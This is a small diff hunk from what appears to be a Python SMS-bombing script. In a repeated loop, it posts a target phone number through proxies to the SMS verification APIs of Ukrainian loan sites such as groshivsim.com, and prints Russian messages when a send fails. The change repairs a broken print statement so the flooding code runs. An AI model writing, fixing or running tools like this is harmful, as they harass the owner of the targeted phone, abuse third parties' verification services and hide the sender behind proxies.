@@ -148,7 +148,7 @@ for _ in track(range(run)):
          print('Не отправлено (izibank.com.ua)')
  try:
          requests.post("https://admin1.groshivsim.com/api/sms/phone-verification/create", json={"phone": number}, headers=headers, proxies=proxies)
-         print(groshivsim.com'')
+         print('groshivsim.com')
  except:
          print('Не отправлено (groshivsim.com)')
  try:
